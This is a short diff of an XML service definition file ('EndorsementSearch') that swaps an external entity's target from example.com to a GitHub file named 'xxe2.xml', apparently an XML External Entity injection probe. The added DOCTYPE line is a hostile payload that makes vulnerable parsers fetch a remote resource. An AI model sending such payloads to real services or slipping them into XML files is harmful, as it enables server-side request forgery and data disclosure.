@@ -1,5 +1,5 @@
 <!DOCTYPE example [
-<!ENTITY ext SYSTEM "http://example.com/external.dtd">
+<!ENTITY ext SYSTEM "https://github.com/akshatmahla/xxe/blob/main/xxe2.xml">
 ]>
 <definitions name="EndorsementSearch"
   targetNamespace="http://namespaces.test.ttt"
